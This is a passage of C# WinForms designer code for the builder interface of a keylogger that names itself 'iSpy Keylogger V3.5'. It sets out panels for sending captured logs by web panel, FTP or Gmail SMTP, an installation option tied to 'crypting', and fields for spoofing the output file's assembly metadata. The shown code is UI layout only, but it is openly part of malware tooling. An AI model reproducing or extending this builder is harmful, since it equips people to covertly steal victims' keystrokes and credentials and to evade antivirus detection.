            this.lblInstallation.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblInstallation.Location = new System.Drawing.Point(113, 23);
            this.lblInstallation.Name = "lblInstallation";
            this.lblInstallation.Size = new System.Drawing.Size(260, 20);
            this.lblInstallation.TabIndex = 14;
            this.lblInstallation.Text = "File Installation (Disable if crypting)";
            // 
            // panelDelivery
            // 
            this.panelDelivery.Controls.Add(this.btnTestDelivery);
            this.panelDelivery.Controls.Add(this.nudLogInterval);
            this.panelDelivery.Controls.Add(this.lblLogInterval);
            this.panelDelivery.Controls.Add(this.gbWebPanel);
            this.panelDelivery.Controls.Add(this.gbFTP);
            this.panelDelivery.Controls.Add(this.rbPanel);
            this.panelDelivery.Controls.Add(this.rbFTP);
            this.panelDelivery.Controls.Add(this.rbEmail);
            this.panelDelivery.Controls.Add(this.gbEmail);
            this.panelDelivery.Controls.Add(this.separator1);
            this.panelDelivery.Controls.Add(this.lblDeliveryMethod);
            this.panelDelivery.Location = new System.Drawing.Point(246, 59);
            this.panelDelivery.Name = "panelDelivery";
            this.panelDelivery.Size = new System.Drawing.Size(498, 435);
            this.panelDelivery.TabIndex = 4;
            // 
            // btnTestDelivery
            // 
            this.btnTestDelivery.BackColor = System.Drawing.Color.Transparent;
            this.btnTestDelivery.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.btnTestDelivery.Image = null;
            this.btnTestDelivery.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btnTestDelivery.Location = new System.Drawing.Point(28, 84);
            this.btnTestDelivery.Name = "btnTestDelivery";
            this.btnTestDelivery.Size = new System.Drawing.Size(211, 30);
            this.btnTestDelivery.TabIndex = 21;
            this.btnTestDelivery.Text = "Test Delivery";
            this.btnTestDelivery.TextAlignment = System.Drawing.StringAlignment.Center;
            this.btnTestDelivery.Click += new System.EventHandler(this.btnTestDelivery_Click);
            // 
            // nudLogInterval
            // 
            this.nudLogInterval.BackColor = System.Drawing.Color.Transparent;
            this.nudLogInterval.Font = new System.Drawing.Font("Tahoma", 11F);
            this.nudLogInterval.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(76)))));
            this.nudLogInterval.Location = new System.Drawing.Point(337, 85);
            this.nudLogInterval.Maximum = ((long)(100));
            this.nudLogInterval.Minimum = ((long)(0));
            this.nudLogInterval.MinimumSize = new System.Drawing.Size(93, 28);
            this.nudLogInterval.Name = "nudLogInterval";
            this.nudLogInterval.Size = new System.Drawing.Size(137, 28);
            this.nudLogInterval.TabIndex = 20;
            this.nudLogInterval.Text = "ambiance_NumericUpDown1";
            this.nudLogInterval.TextAlignment = Ambiance_NumericUpDown._TextAlignment.Near;
            this.nudLogInterval.Value = ((long)(30));
            // 
            // lblLogInterval
            // 
            this.lblLogInterval.AutoSize = true;
            this.lblLogInterval.BackColor = System.Drawing.Color.Transparent;
            this.lblLogInterval.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblLogInterval.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblLogInterval.Location = new System.Drawing.Point(241, 88);
            this.lblLogInterval.Name = "lblLogInterval";
            this.lblLogInterval.Size = new System.Drawing.Size(90, 20);
            this.lblLogInterval.TabIndex = 19;
            this.lblLogInterval.Text = "Log Interval:";
            // 
            // gbWebPanel
            // 
            this.gbWebPanel.Controls.Add(this.tbWebPanelUploadKey);
            this.gbWebPanel.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbWebPanel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbWebPanel.Location = new System.Drawing.Point(28, 123);
            this.gbWebPanel.Name = "gbWebPanel";
            this.gbWebPanel.Size = new System.Drawing.Size(446, 73);
            this.gbWebPanel.TabIndex = 18;
            this.gbWebPanel.TabStop = false;
            this.gbWebPanel.Text = "Web Panel";
            // 
            // tbWebPanelUploadKey
            // 
            this.tbWebPanelUploadKey.BackColor = System.Drawing.Color.Transparent;
            this.tbWebPanelUploadKey.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbWebPanelUploadKey.ForeColor = System.Drawing.Color.DimGray;
            this.tbWebPanelUploadKey.Location = new System.Drawing.Point(19, 26);
            this.tbWebPanelUploadKey.MaxLength = 32767;
            this.tbWebPanelUploadKey.Multiline = false;
            this.tbWebPanelUploadKey.Name = "tbWebPanelUploadKey";
            this.tbWebPanelUploadKey.ReadOnly = false;
            this.tbWebPanelUploadKey.Size = new System.Drawing.Size(403, 28);
            this.tbWebPanelUploadKey.TabIndex = 1;
            this.tbWebPanelUploadKey.Text = "Web Panel Upload Key";
            this.tbWebPanelUploadKey.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbWebPanelUploadKey.UseSystemPasswordChar = false;
            // 
            // gbFTP
            // 
            this.gbFTP.Controls.Add(this.tbFTPPassword);
            this.gbFTP.Controls.Add(this.tbFTPUsername);
            this.gbFTP.Controls.Add(this.tbFTPServer);
            this.gbFTP.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbFTP.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbFTP.Location = new System.Drawing.Point(28, 313);
            this.gbFTP.Name = "gbFTP";
            this.gbFTP.Size = new System.Drawing.Size(446, 105);
            this.gbFTP.TabIndex = 17;
            this.gbFTP.TabStop = false;
            this.gbFTP.Text = "FTP";
            // 
            // tbFTPPassword
            // 
            this.tbFTPPassword.BackColor = System.Drawing.Color.Transparent;
            this.tbFTPPassword.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbFTPPassword.ForeColor = System.Drawing.Color.DimGray;
            this.tbFTPPassword.Location = new System.Drawing.Point(217, 26);
            this.tbFTPPassword.MaxLength = 32767;
            this.tbFTPPassword.Multiline = false;
            this.tbFTPPassword.Name = "tbFTPPassword";
            this.tbFTPPassword.ReadOnly = false;
            this.tbFTPPassword.Size = new System.Drawing.Size(205, 28);
            this.tbFTPPassword.TabIndex = 3;
            this.tbFTPPassword.Text = "password";
            this.tbFTPPassword.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbFTPPassword.UseSystemPasswordChar = true;
            // 
            // tbFTPUsername
            // 
            this.tbFTPUsername.BackColor = System.Drawing.Color.Transparent;
            this.tbFTPUsername.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbFTPUsername.ForeColor = System.Drawing.Color.DimGray;
            this.tbFTPUsername.Location = new System.Drawing.Point(19, 27);
            this.tbFTPUsername.MaxLength = 32767;
            this.tbFTPUsername.Multiline = false;
            this.tbFTPUsername.Name = "tbFTPUsername";
            this.tbFTPUsername.ReadOnly = false;
            this.tbFTPUsername.Size = new System.Drawing.Size(192, 28);
            this.tbFTPUsername.TabIndex = 2;
            this.tbFTPUsername.Text = "username";
            this.tbFTPUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbFTPUsername.UseSystemPasswordChar = false;
            // 
            // tbFTPServer
            // 
            this.tbFTPServer.BackColor = System.Drawing.Color.Transparent;
            this.tbFTPServer.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbFTPServer.ForeColor = System.Drawing.Color.DimGray;
            this.tbFTPServer.Location = new System.Drawing.Point(19, 61);
            this.tbFTPServer.MaxLength = 32767;
            this.tbFTPServer.Multiline = false;
            this.tbFTPServer.Name = "tbFTPServer";
            this.tbFTPServer.ReadOnly = false;
            this.tbFTPServer.Size = new System.Drawing.Size(403, 28);
            this.tbFTPServer.TabIndex = 1;
            this.tbFTPServer.Text = "ftp.host.com";
            this.tbFTPServer.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbFTPServer.UseSystemPasswordChar = false;
            // 
            // rbPanel
            // 
            this.rbPanel.BackColor = System.Drawing.Color.Transparent;
            this.rbPanel.Checked = true;
            this.rbPanel.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.rbPanel.Location = new System.Drawing.Point(28, 53);
            this.rbPanel.Name = "rbPanel";
            this.rbPanel.Size = new System.Drawing.Size(96, 15);
            this.rbPanel.TabIndex = 15;
            this.rbPanel.Text = "Web Panel";
            // 
            // rbFTP
            // 
            this.rbFTP.BackColor = System.Drawing.Color.Transparent;
            this.rbFTP.Checked = false;
            this.rbFTP.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.rbFTP.Location = new System.Drawing.Point(403, 53);
            this.rbFTP.Name = "rbFTP";
            this.rbFTP.Size = new System.Drawing.Size(60, 15);
            this.rbFTP.TabIndex = 14;
            this.rbFTP.Text = "FTP";
            // 
            // rbEmail
            // 
            this.rbEmail.BackColor = System.Drawing.Color.Transparent;
            this.rbEmail.Checked = false;
            this.rbEmail.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.rbEmail.Location = new System.Drawing.Point(245, 53);
            this.rbEmail.Name = "rbEmail";
            this.rbEmail.Size = new System.Drawing.Size(73, 15);
            this.rbEmail.TabIndex = 13;
            this.rbEmail.Text = "E-mail";
            // 
            // gbEmail
            // 
            this.gbEmail.Controls.Add(this.cbSSL);
            this.gbEmail.Controls.Add(this.tbEmailPort);
            this.gbEmail.Controls.Add(this.tbEmailServer);
            this.gbEmail.Controls.Add(this.tbEmailPassword);
            this.gbEmail.Controls.Add(this.tbEmailUsername);
            this.gbEmail.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbEmail.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbEmail.Location = new System.Drawing.Point(28, 202);
            this.gbEmail.Name = "gbEmail";
            this.gbEmail.Size = new System.Drawing.Size(446, 105);
            this.gbEmail.TabIndex = 16;
            this.gbEmail.TabStop = false;
            this.gbEmail.Text = "E-mail";
            // 
            // cbSSL
            // 
            this.cbSSL.BackColor = System.Drawing.Color.Transparent;
            this.cbSSL.Checked = true;
            this.cbSSL.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbSSL.Location = new System.Drawing.Point(377, 66);
            this.cbSSL.Name = "cbSSL";
            this.cbSSL.Size = new System.Drawing.Size(45, 19);
            this.cbSSL.TabIndex = 4;
            this.cbSSL.Text = "SSL";
            // 
            // tbEmailPort
            // 
            this.tbEmailPort.BackColor = System.Drawing.Color.Transparent;
            this.tbEmailPort.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbEmailPort.ForeColor = System.Drawing.Color.DimGray;
            this.tbEmailPort.Location = new System.Drawing.Point(217, 60);
            this.tbEmailPort.MaxLength = 32767;
            this.tbEmailPort.Multiline = false;
            this.tbEmailPort.Name = "tbEmailPort";
            this.tbEmailPort.ReadOnly = false;
            this.tbEmailPort.Size = new System.Drawing.Size(154, 28);
            this.tbEmailPort.TabIndex = 3;
            this.tbEmailPort.Text = "587";
            this.tbEmailPort.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbEmailPort.UseSystemPasswordChar = false;
            // 
            // tbEmailServer
            // 
            this.tbEmailServer.BackColor = System.Drawing.Color.Transparent;
            this.tbEmailServer.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbEmailServer.ForeColor = System.Drawing.Color.DimGray;
            this.tbEmailServer.Location = new System.Drawing.Point(19, 60);
            this.tbEmailServer.MaxLength = 32767;
            this.tbEmailServer.Multiline = false;
            this.tbEmailServer.Name = "tbEmailServer";
            this.tbEmailServer.ReadOnly = false;
            this.tbEmailServer.Size = new System.Drawing.Size(192, 28);
            this.tbEmailServer.TabIndex = 2;
            this.tbEmailServer.Text = "smtp.gmail.com";
            this.tbEmailServer.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbEmailServer.UseSystemPasswordChar = false;
            // 
            // tbEmailPassword
            // 
            this.tbEmailPassword.BackColor = System.Drawing.Color.Transparent;
            this.tbEmailPassword.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbEmailPassword.ForeColor = System.Drawing.Color.DimGray;
            this.tbEmailPassword.Location = new System.Drawing.Point(217, 26);
            this.tbEmailPassword.MaxLength = 32767;
            this.tbEmailPassword.Multiline = false;
            this.tbEmailPassword.Name = "tbEmailPassword";
            this.tbEmailPassword.ReadOnly = false;
            this.tbEmailPassword.Size = new System.Drawing.Size(205, 28);
            this.tbEmailPassword.TabIndex = 1;
            this.tbEmailPassword.Text = "password";
            this.tbEmailPassword.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbEmailPassword.UseSystemPasswordChar = true;
            // 
            // tbEmailUsername
            // 
            this.tbEmailUsername.BackColor = System.Drawing.Color.Transparent;
            this.tbEmailUsername.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbEmailUsername.ForeColor = System.Drawing.Color.DimGray;
            this.tbEmailUsername.Location = new System.Drawing.Point(19, 26);
            this.tbEmailUsername.MaxLength = 32767;
            this.tbEmailUsername.Multiline = false;
            this.tbEmailUsername.Name = "tbEmailUsername";
            this.tbEmailUsername.ReadOnly = false;
            this.tbEmailUsername.Size = new System.Drawing.Size(192, 28);
            this.tbEmailUsername.TabIndex = 0;
            this.tbEmailUsername.Text = "username@gmail.com";
            this.tbEmailUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbEmailUsername.UseSystemPasswordChar = false;
            // 
            // separator1
            // 
            this.separator1.Location = new System.Drawing.Point(28, 34);
            this.separator1.Name = "separator1";
            this.separator1.Size = new System.Drawing.Size(446, 10);
            this.separator1.TabIndex = 12;
            this.separator1.Text = "ambiance_Separator1";
            // 
            // lblDeliveryMethod
            // 
            this.lblDeliveryMethod.AutoSize = true;
            this.lblDeliveryMethod.BackColor = System.Drawing.Color.Transparent;
            this.lblDeliveryMethod.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblDeliveryMethod.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblDeliveryMethod.Location = new System.Drawing.Point(24, 15);
            this.lblDeliveryMethod.Name = "lblDeliveryMethod";
            this.lblDeliveryMethod.Size = new System.Drawing.Size(126, 20);
            this.lblDeliveryMethod.TabIndex = 11;
            this.lblDeliveryMethod.Text = "Delivery Method";
            // 
            // panelDashboard
            // 
            this.panelDashboard.Controls.Add(this.ambiance_HeaderLabel4);
            this.panelDashboard.Controls.Add(this.ambiance_HeaderLabel3);
            this.panelDashboard.Controls.Add(this.ambiance_HeaderLabel2);
            this.panelDashboard.Controls.Add(this.ambiance_HeaderLabel1);
            this.panelDashboard.Location = new System.Drawing.Point(246, 59);
            this.panelDashboard.Name = "panelDashboard";
            this.panelDashboard.Size = new System.Drawing.Size(498, 435);
            this.panelDashboard.TabIndex = 3;
            // 
            // ambiance_HeaderLabel4
            // 
            this.ambiance_HeaderLabel4.AutoSize = true;
            this.ambiance_HeaderLabel4.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_HeaderLabel4.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_HeaderLabel4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.ambiance_HeaderLabel4.Location = new System.Drawing.Point(83, 141);
            this.ambiance_HeaderLabel4.Name = "ambiance_HeaderLabel4";
            this.ambiance_HeaderLabel4.Size = new System.Drawing.Size(242, 20);
            this.ambiance_HeaderLabel4.TabIndex = 15;
            this.ambiance_HeaderLabel4.Text = "Plugin System or Crypter first idk";
            // 
            // ambiance_HeaderLabel3
            // 
            this.ambiance_HeaderLabel3.AutoSize = true;
            this.ambiance_HeaderLabel3.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_HeaderLabel3.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_HeaderLabel3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.ambiance_HeaderLabel3.Location = new System.Drawing.Point(83, 104);
            this.ambiance_HeaderLabel3.Name = "ambiance_HeaderLabel3";
            this.ambiance_HeaderLabel3.Size = new System.Drawing.Size(201, 20);
            this.ambiance_HeaderLabel3.TabIndex = 14;
            this.ambiance_HeaderLabel3.Text = "Adding more features soon";
            // 
            // ambiance_HeaderLabel2
            // 
            this.ambiance_HeaderLabel2.AutoSize = true;
            this.ambiance_HeaderLabel2.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_HeaderLabel2.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_HeaderLabel2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.ambiance_HeaderLabel2.Location = new System.Drawing.Point(83, 71);
            this.ambiance_HeaderLabel2.Name = "ambiance_HeaderLabel2";
            this.ambiance_HeaderLabel2.Size = new System.Drawing.Size(160, 20);
            this.ambiance_HeaderLabel2.TabIndex = 13;
            this.ambiance_HeaderLabel2.Text = "New GUI-beta in v3.5";
            // 
            // ambiance_HeaderLabel1
            // 
            this.ambiance_HeaderLabel1.AutoSize = true;
            this.ambiance_HeaderLabel1.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_HeaderLabel1.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_HeaderLabel1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.ambiance_HeaderLabel1.Location = new System.Drawing.Point(83, 40);
            this.ambiance_HeaderLabel1.Name = "ambiance_HeaderLabel1";
            this.ambiance_HeaderLabel1.Size = new System.Drawing.Size(215, 20);
            this.ambiance_HeaderLabel1.TabIndex = 12;
            this.ambiance_HeaderLabel1.Text = "Dashboard Page, (Not in use)";
            // 
            // panelAbout
            // 
            this.panelAbout.Controls.Add(this.pbAbout);
            this.panelAbout.Controls.Add(this.lblAboutInfo);
            this.panelAbout.Controls.Add(this.separator9);
            this.panelAbout.Controls.Add(this.lblAbout);
            this.panelAbout.Location = new System.Drawing.Point(246, 59);
            this.panelAbout.Name = "panelAbout";
            this.panelAbout.Size = new System.Drawing.Size(498, 435);
            this.panelAbout.TabIndex = 20;
            // 
            // pbAbout
            // 
            this.pbAbout.Image = ((System.Drawing.Image)(resources.GetObject("pbAbout.Image")));
            this.pbAbout.Location = new System.Drawing.Point(24, 197);
            this.pbAbout.Name = "pbAbout";
            this.pbAbout.Size = new System.Drawing.Size(446, 228);
            this.pbAbout.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pbAbout.TabIndex = 12;
            this.pbAbout.TabStop = false;
            // 
            // lblAboutInfo
            // 
            this.lblAboutInfo.AutoSize = true;
            this.lblAboutInfo.BackColor = System.Drawing.Color.Transparent;
            this.lblAboutInfo.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblAboutInfo.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblAboutInfo.Location = new System.Drawing.Point(19, 44);
            this.lblAboutInfo.Name = "lblAboutInfo";
            this.lblAboutInfo.Size = new System.Drawing.Size(446, 150);
            this.lblAboutInfo.TabIndex = 11;
            this.lblAboutInfo.Text = "iSpy Keylogger V3.5\r\nDeveloped by Venomous Net\r\nE-Mail: venomous.net@gmail.com\r\nS" +
    "kype: venomous.net\r\nContact me for any questions or private projects.";
            // 
            // separator9
            // 
            this.separator9.Location = new System.Drawing.Point(24, 31);
            this.separator9.Name = "separator9";
            this.separator9.Size = new System.Drawing.Size(446, 10);
            this.separator9.TabIndex = 10;
            this.separator9.Text = "ambiance_Separator8";
            // 
            // lblAbout
            // 
            this.lblAbout.AutoSize = true;
            this.lblAbout.BackColor = System.Drawing.Color.Transparent;
            this.lblAbout.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblAbout.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblAbout.Location = new System.Drawing.Point(20, 12);
            this.lblAbout.Name = "lblAbout";
            this.lblAbout.Size = new System.Drawing.Size(53, 20);
            this.lblAbout.TabIndex = 9;
            this.lblAbout.Text = "About";
            // 
            // panelAssembly
            // 
            this.panelAssembly.Controls.Add(this.lblVersion);
            this.panelAssembly.Controls.Add(this.lblCopyright);
            this.panelAssembly.Controls.Add(this.lblProduct);
            this.panelAssembly.Controls.Add(this.lblCompany);
            this.panelAssembly.Controls.Add(this.lblDescriptionAsm);
            this.panelAssembly.Controls.Add(this.lblTitle);
            this.panelAssembly.Controls.Add(this.tbVersion);
            this.panelAssembly.Controls.Add(this.tbCopyright);
            this.panelAssembly.Controls.Add(this.tbProduct);
            this.panelAssembly.Controls.Add(this.tbCompany);
            this.panelAssembly.Controls.Add(this.tbDescription);
            this.panelAssembly.Controls.Add(this.tbTitle);
            this.panelAssembly.Controls.Add(this.cbChangeAssembly);
            this.panelAssembly.Controls.Add(this.separator6);
            this.panelAssembly.Controls.Add(this.lblAssembly);
            this.panelAssembly.Location = new System.Drawing.Point(246, 59);
            this.panelAssembly.Name = "panelAssembly";
            this.panelAssembly.Size = new System.Drawing.Size(498, 435);
            this.panelAssembly.TabIndex = 9;
            // 
            // lblVersion
            // 
            this.lblVersion.AutoSize = true;
            this.lblVersion.BackColor = System.Drawing.Color.Transparent;
            this.lblVersion.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblVersion.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblVersion.Location = new System.Drawing.Point(22, 280);
            this.lblVersion.Name = "lblVersion";
            this.lblVersion.Size = new System.Drawing.Size(61, 20);
            this.lblVersion.TabIndex = 33;
            this.lblVersion.Text = "Version:";
            // 
            // lblCopyright
            // 
            this.lblCopyright.AutoSize = true;
            this.lblCopyright.BackColor = System.Drawing.Color.Transparent;
            this.lblCopyright.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblCopyright.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblCopyright.Location = new System.Drawing.Point(22, 243);
            this.lblCopyright.Name = "lblCopyright";
            this.lblCopyright.Size = new System.Drawing.Size(77, 20);
            this.lblCopyright.TabIndex = 32;
            this.lblCopyright.Text = "Copyright:";
            // 
            // lblProduct
            // 
            this.lblProduct.AutoSize = true;
            this.lblProduct.BackColor = System.Drawing.Color.Transparent;
            this.lblProduct.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblProduct.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblProduct.Location = new System.Drawing.Point(22, 206);
            this.lblProduct.Name = "lblProduct";
            this.lblProduct.Size = new System.Drawing.Size(63, 20);
            this.lblProduct.TabIndex = 31;
            this.lblProduct.Text = "Product:";
            // 
            // lblCompany
            // 
            this.lblCompany.AutoSize = true;
            this.lblCompany.BackColor = System.Drawing.Color.Transparent;
            this.lblCompany.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblCompany.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblCompany.Location = new System.Drawing.Point(22, 169);
            this.lblCompany.Name = "lblCompany";
            this.lblCompany.Size = new System.Drawing.Size(75, 20);
            this.lblCompany.TabIndex = 30;
            this.lblCompany.Text = "Company:";
            // 
            // lblDescriptionAsm
            // 
            this.lblDescriptionAsm.AutoSize = true;
            this.lblDescriptionAsm.BackColor = System.Drawing.Color.Transparent;
            this.lblDescriptionAsm.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblDescriptionAsm.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblDescriptionAsm.Location = new System.Drawing.Point(22, 132);
            this.lblDescriptionAsm.Name = "lblDescriptionAsm";
            this.lblDescriptionAsm.Size = new System.Drawing.Size(88, 20);
            this.lblDescriptionAsm.TabIndex = 29;
            this.lblDescriptionAsm.Text = "Description:";
            // 
            // lblTitle
            // 
            this.lblTitle.AutoSize = true;
            this.lblTitle.BackColor = System.Drawing.Color.Transparent;
            this.lblTitle.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblTitle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblTitle.Location = new System.Drawing.Point(22, 95);
            this.lblTitle.Name = "lblTitle";
            this.lblTitle.Size = new System.Drawing.Size(41, 20);
            this.lblTitle.TabIndex = 28;
            this.lblTitle.Text = "Title:";
            // 
            // tbVersion
            // 
            this.tbVersion.BackColor = System.Drawing.Color.Transparent;
            this.tbVersion.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbVersion.ForeColor = System.Drawing.Color.DimGray;
            this.tbVersion.Location = new System.Drawing.Point(121, 272);
            this.tbVersion.MaxLength = 32767;
            this.tbVersion.Multiline = false;
            this.tbVersion.Name = "tbVersion";
            this.tbVersion.ReadOnly = false;
            this.tbVersion.Size = new System.Drawing.Size(351, 28);
            this.tbVersion.TabIndex = 27;
            this.tbVersion.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbVersion.UseSystemPasswordChar = false;
            // 
            // tbCopyright
            // 
            this.tbCopyright.BackColor = System.Drawing.Color.Transparent;
            this.tbCopyright.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbCopyright.ForeColor = System.Drawing.Color.DimGray;
            this.tbCopyright.Location = new System.Drawing.Point(121, 235);
            this.tbCopyright.MaxLength = 32767;
            this.tbCopyright.Multiline = false;
            this.tbCopyright.Name = "tbCopyright";
            this.tbCopyright.ReadOnly = false;
            this.tbCopyright.Size = new System.Drawing.Size(351, 28);
            this.tbCopyright.TabIndex = 26;
            this.tbCopyright.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbCopyright.UseSystemPasswordChar = false;
            // 
            // tbProduct
            // 
            this.tbProduct.BackColor = System.Drawing.Color.Transparent;
            this.tbProduct.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbProduct.ForeColor = System.Drawing.Color.DimGray;
            this.tbProduct.Location = new System.Drawing.Point(121, 198);
            this.tbProduct.MaxLength = 32767;
            this.tbProduct.Multiline = false;
            this.tbProduct.Name = "tbProduct";
            this.tbProduct.ReadOnly = false;
            this.tbProduct.Size = new System.Drawing.Size(351, 28);
            this.tbProduct.TabIndex = 25;
            this.tbProduct.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbProduct.UseSystemPasswordChar = false;
            // 
            // tbCompany
            // 
            this.tbCompany.BackColor = System.Drawing.Color.Transparent;
            this.tbCompany.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbCompany.ForeColor = System.Drawing.Color.DimGray;
            this.tbCompany.Location = new System.Drawing.Point(121, 161);
            this.tbCompany.MaxLength = 32767;
            this.tbCompany.Multiline = false;
            this.tbCompany.Name = "tbCompany";
            this.tbCompany.ReadOnly = false;
            this.tbCompany.Size = new System.Drawing.Size(351, 28);
            this.tbCompany.TabIndex = 24;
            this.tbCompany.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbCompany.UseSystemPasswordChar = false;
            // 
            // tbDescription
            // 
            this.tbDescription.BackColor = System.Drawing.Color.Transparent;
            this.tbDescription.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbDescription.ForeColor = System.Drawing.Color.DimGray;
            this.tbDescription.Location = new System.Drawing.Point(121, 124);
            this.tbDescription.MaxLength = 32767;
            this.tbDescription.Multiline = false;
            this.tbDescription.Name = "tbDescription";
            this.tbDescription.ReadOnly = false;
            this.tbDescription.Size = new System.Drawing.Size(351, 28);
            this.tbDescription.TabIndex = 23;
            this.tbDescription.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbDescription.UseSystemPasswordChar = false;
            // 
            // tbTitle
            // 
            this.tbTitle.BackColor = System.Drawing.Color.Transparent;
            this.tbTitle.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbTitle.ForeColor = System.Drawing.Color.DimGray;
            this.tbTitle.Location = new System.Drawing.Point(121, 87);
            this.tbTitle.MaxLength = 32767;
            this.tbTitle.Multiline = false;
            this.tbTitle.Name = "tbTitle";
            this.tbTitle.ReadOnly = false;
            this.tbTitle.Size = new System.Drawing.Size(351, 28);
            this.tbTitle.TabIndex = 22;
            this.tbTitle.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbTitle.UseSystemPasswordChar = false;
            // 
            // cbChangeAssembly
            // 
            this.cbChangeAssembly.BackColor = System.Drawing.Color.Transparent;
            this.cbChangeAssembly.Checked = false;
            this.cbChangeAssembly.Font = new System.Drawing.Font("Segoe UI", 12F);
